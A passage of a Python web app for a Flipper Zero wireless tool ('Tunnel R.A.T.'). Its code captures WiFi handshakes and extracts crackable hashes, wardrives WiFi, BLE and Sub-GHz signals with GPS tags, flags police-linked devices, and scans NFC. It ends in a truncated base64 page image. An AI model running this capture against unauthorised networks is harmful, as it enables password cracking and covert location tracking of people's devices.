                    time.sleep(1)
                if p.poll() is None:
                    p.terminate()
                    try:
                        p.wait(5)
                    except Exception:
                        p.kill()
                if time.time() - t0 > 5:
                    break          # ran properly; otherwise retry with the other -c syntax
        finally:
            _sp.run(['nmcli', 'device', 'set', iface, 'managed', 'yes'], stderr=_sp.DEVNULL)
        if not os.path.exists(out):
            self.send('TR ERR no capture written'); return
        hashes = 0
        if shutil.which('hcxpcapngtool'):
            h = out.replace('.pcapng', '.22000')
            _sp.run(['hcxpcapngtool', '-o', h, out], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
            try:
                with open(h) as f:
                    hashes = sum(1 for l in f if tag.lower() in l.lower())
            except Exception:
                pass
        log(f'Flipper link handshake capture {bssid}: {hashes} hash(es) -> {os.path.basename(out)}')
        self.send(f'TR MSG saved flipper/{os.path.basename(out)}')
        self.send(f'TR END AUDIT {hashes} hash(es) for {bssid}')

    def _wardrive(self, ev):
        self.send('TR MSG wardrive running: WiFi+BLE every 20s, Flipper Sub-GHz in between')
        rounds = 0
        while not ev.is_set():
            lat, lon, alt = _fz_gps()
            aps, bts = _fz_wifi_scan(), _fz_ble_scan(6)
            items = []
            for a in aps:
                layer = {'FLOCK': 'flock', 'FLOCK?': 'flock', 'AXON': 'axon',
                         'MOTO': 'motorola'}.get(a['flag'], 'wifi')
                items.append({'layer': layer, 'mac': a['mac'], 'name': a['ssid'],
                              'rssi': a['rssi'], 'chan': a['chan'], 'lat': lat, 'lon': lon,
                              'alt': alt})
            for d in bts:
                layer = {'AXON': 'axon', 'MOTO': 'motorola', 'MESH': 'mesh',
                         'FLOCK': 'flock', 'FLOCK?': 'flock'}.get(d['flag'], 'ble')
                items.append({'layer': layer, 'mac': d['mac'], 'name': d['name'],
                              'rssi': d['rssi'], 'chan': 0, 'lat': lat, 'lon': lon, 'alt': alt})
            _fz_sightings(items)
            self._send_aps([a for a in aps if a['flag'] != '-'])
            self._send_bts([d for d in bts if d['flag'] != '-'])
            sub = 0
            if _fz_usb_port() and not ev.is_set():
                freq = FZ_SUBGHZ_HOPS[rounds % len(FZ_SUBGHZ_HOPS)]
                hits, err = _fz_subghz_hop(freq, 6)
                for proto, data in hits or []:
                    sub += 1
                    _fz_save_jsonl('subghz', {'freq': freq, 'proto': proto, 'data': data,
                                              'lat': lat, 'lon': lon, 'ts': int(time.time())})
                    self.send(f'TR SUB {freq/1e6:.2f}|{proto}|{data}')
            rounds += 1
            fix = 'fix' if (lat or lon) else 'no fix'
            self.send(f'TR STAT round {rounds}: {len(aps)} APs {len(bts)} BLE {sub} SubGHz, GPS {fix}')
            for _ in range(20):
                if ev.is_set():
                    break
                time.sleep(0.5)

    def _subghz(self, ev):
        if not _fz_usb_port():
            self.send('TR ERR Flipper CLI channel not found'); return
        i = 0
        while not ev.is_set():
            freq = FZ_SUBGHZ_HOPS[i % len(FZ_SUBGHZ_HOPS)]; i += 1
            hits, err = _fz_subghz_hop(freq, 8)
            if err:
                self.send(f'TR ERR {err}'); time.sleep(2); continue
            lat, lon, _ = _fz_gps()
            for proto, data in hits:
                _fz_save_jsonl('subghz', {'freq': freq, 'proto': proto, 'data': data,
                                          'lat': lat, 'lon': lon, 'ts': int(time.time())})
                self.send(f'TR SUB {freq/1e6:.2f}|{proto}|{data}')
            if i % len(FZ_SUBGHZ_HOPS) == 0:
                self.send(f'TR STAT hop cycle {i // len(FZ_SUBGHZ_HOPS)} done')

    def _nfc(self, ev):
        if not _fz_usb_port():
            self.send('TR ERR Flipper CLI channel not found'); return
        FZ.cmd('nfc', timeout=4)
        try:
            while not ev.is_set():
                out = FZ.cmd('scanner', seconds=6)
                if ev.is_set():
                    break
                protos = [m.group(1).strip() for m in
                          re.finditer(r'Protocol \[\d+\]:\s*(.+)', out)]
                if protos:
                    lat, lon, _ = _fz_gps()
                    text = ' / '.join(protos)[:120]
                    _fz_save_jsonl('nfc', {'protocols': protos, 'lat': lat, 'lon': lon,
                                           'ts': int(time.time())})
                    self.send(f'TR NFC {text}')
                    time.sleep(1.5)
        finally:
            try:
                FZ.cmd('exit', timeout=3)
            except Exception:
                pass

    def _recon(self, ev, secs):
        import json as _json
        lat, lon, alt = _fz_gps()
        self.send('TR MSG [1/3] WiFi scan')
        aps = _fz_wifi_scan(); self._send_aps([a for a in aps if a['flag'] != '-'])
        self.send(f'TR MSG {len(aps)} APs')
        self.send('TR MSG [2/3] Bluetooth scan')
        bts = _fz_ble_scan(8); self._send_bts([d for d in bts if d['flag'] != '-'])
        self.send(f'TR MSG {len(bts)} BLE devices')
        subs = []
        if _fz_usb_port():
            self.send('TR MSG [3/3] Sub-GHz sweep')
            per = max(4, (secs - 20) // 3)
            for freq in FZ_SUBGHZ_HOPS[:3]:
                if ev.is_set():
                    break
                hits, _ = _fz_subghz_hop(freq, per)
                for proto, data in hits or []:
                    subs.append({'freq': freq, 'proto': proto, 'data': data})
                    self.send(f'TR SUB {freq/1e6:.2f}|{proto}|{data}')
        flagged = [a for a in aps if a['flag'] != '-'] + [d for d in bts if d['flag'] != '-']
        rep = {'ts': int(time.time()), 'lat': lat, 'lon': lon, 'alt': alt,
               'wifi': aps, 'ble': bts, 'subghz': subs, 'flagged': flagged}
        d = TOOL_DIRS['flipper']; os.makedirs(d, exist_ok=True)
        path = f'{d}/{stamp()}_rat_recon.json'
        with open(path, 'w') as f:
            _json.dump(rep, f, indent=1)
        log(f'Rat Recon: {len(aps)} APs, {len(bts)} BLE, {len(subs)} Sub-GHz, {len(flagged)} flagged')
        self.send(f'TR MSG report: flipper/{os.path.basename(path)}')
        self.send(f'TR END RECON {len(aps)} wifi {len(bts)} ble {len(subs)} subghz {len(flagged)} flagged')


FZ_PEER = _FZLinkPeer()
try:
    import serial as _serial_check  # noqa: F401
    FZ_PEER.start()
except Exception:
    pass

@app.route('/api/fz/link')
def fz_link_status():
    return jsonify(FZ_PEER.status())

HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Tunnel R.A.T.</title>
<style>
:root{--red:#ff2222;--dred:#cc0000;--xred:#ff4444;--dim:#440000;--ddim:#220000;--bg:#080000;--card:#0d0000;--border:#330000;--sec:#ff4444;--tabc:#ff2222}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg) url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAIBAQEBAQIBAQECAgICAgQDAgICAgUEBAMEBgUGBgYFBgYGBwkIBgcJBwYGCAsICQoKCgoKBggLDAsKDAkKCgr/2wBDAQICAgICAgUDAwUKBwYHCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgr/wAARCAQ4B4ADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD8B6KKKzPQCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiumsfhD441K2sLvT4NMmXU7wWlgI/EFkWmnJjHlhfOzuHmx5GMjeM4qp4Y+HXjLxlNYweG9H+0vqVxcw2Q+0Rp5klvCk0w+dhjbG6tk4BzgZORWP1nD2b51Zb6rTf8Ayf3M9P8AsXOPaQp/VqnNO3KuSV5XcUrK2t3OKVt3KPdXxKK3PDfw28a+Lbmzs9A0Qzy6hc3VvaI08cZeS3iWaZfnYbdqOp5xnOBkgio9G8A+K9eFu2m6am26lu44nnuooVDWsKz3G4yMoQJG6sS2Ac4GSCKbr0E3eS0815/5P7n2M4ZVmk1FxoTak7K0Zat8lktNX+8hov54fzK+PRWpqXg/XdKsrjUrhLWS3tZ4IZ57PUYLhFkmWVo1zE7AkiGQ8dNvOMjLvDngjxD4qs7jUdIjtBBazwwzzXmp29soklEhjQGZ13EiKQ4Gfumm61JR5nJW73/ruiI5dmE66oRoyc2m1Hld2le7Stdpcrv2s77MyaK1dM8EeKtX1e90Gw0aRrzToppL63dlRoViOHB3Ecg8bepJAAJIFO8LeB/EHjNpY9AFi7wRvJJHc6tbW7bERpHYCaRSyqisxIyAAc0OtRim3JWW+o6eXZhWqRhTozcpNqKUW22t0lbVrqlt1Miipr+ym068ksbh4WeJtrNBcJKhPs6Eqw9wSKhq001dHJKMoScZKzQUUUUyQooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtfBvjjQ/DVj4MubqV5JdD8a3Gp3tvGh3CAjTypBPykkwSjGcjbzjIzf0XxR4S8IWFj4ftvFkV79lt/EUxv7S2nRBJeaattBGA6K+7fEuTjaPMHPBI87orjngqU73b1v2683l05nb8bn0eH4mx2HUeWEXy8lm1LTk9l2kvi9jDmv2fLy3PV7j4neCrrT9K1iPVzBqVxbeIp9ZgS2kHkXt1pcdsjKQuD5s0Zf5eE8zBwBmp7T4lfD6/Ohape6pbxXV0niCbxBbXVrceTDdXemRWqljCu4pNLGXPl8oJCOMA15DRWLyvD2STeia6bPm026c2nXRed/Rjx1mylJunTd5U5NNSs5U/ZWl8W8vYrmXwvnnZL3OTvJJPBd54W1rwxD4t0DTWutV027tvssGpNbMsUN6kgBkieQMDNGfm4O7g8ECp4M8WeFfC3hTVdI1rSrHWWm8RabPFaXAuFjlhhjvFkkUo0ZB/eoAH6iT7pwccdRW/1SDhKLk2m09+1uqV+iueUuIa8MRSrU6NOMqcZxXutq0+e6cZNx09pLl0tte9j0W2+Imh+B/E2ueKdOvrPxLfX/AIgjminuYrmISQLIbhpG2+UdzS+VlSNuY2+UgqayNIvvCHhX4i6tJpmurcaS2l6tb6fdrBKN/n2FxHCpVlDBt0iIcjAOTnb81cjRRHBU4qSu/eVn91l0tp5d2VV4kxlWdKThD91P2kdHo+Zyau5OTUm1fmbfuqzWt5LmGKCQJDdpMDGjF4wwAJUEr8wBypJU9sg4JGCY6KK61sfPyacm0rBRRRQIKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAoorXtvDVvdXMdnFqLiRlt2k3W4CqJdnQ7uSN44wM4NROpCn8R04bB4jFu1JX+aXd9Wuif3GRRWjYaNZ6o1wtlfy/uLVpf3tuF3MGUBRhj13dacnhwf2db6nNe7EkSR5h5eTEqlAO/zFt64HHUc1Lr0k7N/n6m0csxs4c0Y3Vr3vG1k1Fu9+jav9+ybMyitO00Sxu7q1jTUpfKvJfKik+zDKvkAhhv4xuByCeDUT6fpSWKX51G42yTPGi/ZFzlVQkn95x9/wB+lHtqbdv0f9dBPLsUoObSt/ij5ef95feUaKt2GlG+s7i68/aYl/dptz5hALEe2FUn8vWpZNDiFwdOhvt14rqjQtHhSxYKVVs8kE88DofSm6tNSs2RDA4qdNTjHR7arXfTffR6b+WqM+itCHSLC7vIbOz1XcZLpIHLQ4xuONyjd8w+uD09abaaXaahO8dldXDiOIyOPso3nBAwqhzu656jgGj2sP6TGsvxTask7uytKLu1vbXpco0VpJoMDQvc/b2MSylBIluSFO0HL8/IOcd+QfSodPsNPu7Wee4vpo2t4vMZUtwwI3qvBLjnLDt2o9tTtf8ARg8BilJRaV2m/ijst3v/AMP0KdFai+HEnvW0izvmkvUyDC0OFJH3lDbjyOe2ODz6paaDZ6jdLa2GqM5E8ccrNBgBWcJvX5vmAJHXB5H4T7ela9/zNFleOcklFXba+KO63W+66rdaN7ozKKKK2PPCitTVPDZ025u4VvPMS2h3pII8eZiVYyMZ4wxPr096h1DT9K0/UJbB9RuGMMzRyMLReqkjI/ec8j2rKNanP4X+D/rqd1XLsZQbVSKVnbWUeraXXX4XqtLa7NFGitafw5bJePaW+ou4hvvs9w724XZ975hhjkYVj26UxvDoiMrXF6FjgllWRxHn5UKjcBnnJdQB+tJYik+v5lSyrHxveG2j1jbz1vbTq+mvYzKK0o9Es5Ld9QGoyG2WEvvFuN+4OilSu7H8anOelOn8NeQi3LXv7jc3mSGPGxdkbjjP3j5gG31HXuD29K9r/mH9l47l5uXTR7x2ez3289ra7GXRWhpehxagIJJr/wAlJXnDOY87BFGr5685zj2x3pk2kpZRrJqM7x5uZYXWOIMVKBDnlhnO/wDTvmq9rT5uW+v/AA/+Rn/Z+L9j7Xl93vddVFq+umklv59nalRWpeaHplm12JNUnItLoQMVtFyzHfyP3nT5P1qle2a2sVvMkpcXEJkGVwQBI6Y6n+7n8aI1YT2/Xtf8hVsDiaF+dLS7eqe0uXo310IKKuvo+zWLnSftH/Ht5/7zZ97y1ZumeM7fwz3ovNLtbRZojqGbm3wJYWjwCc4IVs/MQTzwOh9KPawulfcHgcSoSk1pFtPVbrVrfX5b9ClRWqNB05tbfRRq0imF5RNM9qAqiNWJIw5z932qNfD0iQtNeXHlCKWVbjCbigTy+RzzkyADp9aXt6Xf8zV5Xjkm+XRNp6xaTVr3103Wu2/Z2zqKvxaXYS+bMNScwxWom3LAC/8ArFTaV3YBy2ep4x61SmEKyEQOzJn5WdNpP4AnH51UZxk7I5quHq0Ypztrtqn+T203G0UUVZgFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABWvb+LLiK4ieaJ5IoRbmKAznCtFsG4ccZCt/313xzkUVE6cKnxI6cPjMThHelK3/AAL/AObNRPEbQzNcRLcyO0aqGurvzCuJEcY+UcfJjHvSy+JI5VNudPxblnBi83nyysYVQcdV8pTnue1ZVFR9XpXvY3ea49xcXPR+S737ff32ehfi1mK2u7KS1sysNnOJVieXLO24EktgddoHTtS2eti20r+zGW5A813LW935YbcqjDDac42/qaz6Kp0abW39f0yI5hi4u6l+C8l2/ur7i/Ya9cadHBBAHEaSl7iMSkCcHAKnHbAx36mnS65Cbo6lBYbbt5FdpXk3AMGDFlXAwSRzyep9azqKXsablewLMMZGmoKWi20WmltNNNOq9dzQh1ewtL2C8s9KKGO7Sdg024nac7VO0bR+fb0ol1e2nnEtxDdzDZtDTXu50OQQVbbx+R61n0Uexp3v+rD+0MVy8t1a97csbX9LGqniWNb7+0jYt5ysCjrPjeAoXEnHzjjJ6ZyfXiha3n2aC5h8vd9ogEec424dHz7/AHcfjUNFONKnFaLt+GxNTHYqq7yl/N0X2laXTqjUTxEsF42r2tkUvn+9MZcqGP3mC44J57kcn8EtNes9OulurDS2QmeOSVWnyCquH2L8vygkDrk8D8cyil7Clbb8zVZpjotNS2be0d3u9t31e70veyJbp7JyPsVvLGP4vNmD5/JVxTZ7ie5fzbmd5Gxjc7EnH40yitEkjilUnJu/XtovuWhqXHiQ3MGoQSWf/H7MzxnzOYd0iuw6fNnavp0zUeu62Nana423KlpWcJNd+YiZOcKNoxWfRWcaFKDul/Wn+R11cyxtem4TndO19F0ba6dHJ/lslbS/4SE/atQufsn/AB/F2Vd/+rZieenOAzDt1zRL4h8+RBLZ5i+yCCeMSYMnIJfOODkKe/TvWbRR7ClfYP7SxvLbn0euy6tt9Orbv92xpR+IWs7d7TS4ZIEMJRGE/wA6sXRmYkAZyEC4GOP1kk8UtNEbaazLRSyO91GZf9azIg3dOGDIWB55b65yaKX1eje9ilmuPUeVT0slaytZdLWtbuuq0emhds9Y+yWqW32fds+0fNvxnzYhH6dsZ9/ajUdYOo6fa2b2+17csXl3Z8zIRRxjjCoB71SoqvZQ5lK2v/D/AOZl9exToypc3utJNWXTlt0/urXffu76qeJds99N5VxH9tuxNm2u/LZMF/lztOR8/t0qvdahYXdpFDJZT+ZBEyRyfaRgguzgkbOT82OozjtVKikqNOLul+fRW/IueY4ypDllK6s1susuZ9P5tfy0NK51qyk1KfVLfT5UkuPP3q9yGA8xWXjCDpuz+H40tx4iSe1u4vsbiS9VfPb7RlN4dWLhccE7fU9fwrMoo9hS002830H/AGnjbSXMvevf3Y/aVn00utNDWvvE4vL6S+8m5JkEwEc15vRPMRl+UbRjG79MUh8SiWyhsbix3hY3S4YS4MoOwKenykeWnPOcVlUUlh6KSVti3m+YScm5/FvotdulvJfK62bT0bPXLexllNrZyxI9qIQYbnbIPnV9xbbyeMdBx9KpXcwuLh51MnzHOZZN7ficDP5VHRVxpwjK63Oari69amqc3otlZK33LzCiiirOYKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACimb29aN7etBHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50Popm9vWje3rQHOh9FM3t60b29aA50JRRRQZBRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQBv+GNQv9O8O6hPp97NA5vbVS8MhUkbJ+MjtwPyqT/hKvE//AEMd/wD+Bj/41V0T/kWL/wD6/wC1/wDQLitDwXpOma34hj0/WPtH2cwTu/2UgSEpC7jGVbuo7EkZxzXn1I0lKpOSvby/uo+0wNXHVMPg8NQqOPMrL3mld1ZrW34kP/CVeJ/+hjv/APwMf/Gj/hKvE/8A0Md//wCBj/41s6p4N0geK9D8PadJcW66n5SXLXMyy+XI1w8TFWVVBUBQQcc9c4Iq/wCDNI8J+NPEC6a3hZLKK21G0yEuZS08L3UUDRSFnPzkSA7k242tx0xjKrhow5uTT0Xe35nrUcBnlbE+wWItJuyvKerUVJ2snayabvbeyu7nL/8ACVeJ/wDoY7//AMDH/wAaP+Eq8T/9DHf/APgY/wDjXR6Roljez6mbrwtoIktNHE9vFFrTGAubqCPc8guSAQruAC46jg8Uw6PYJ4S/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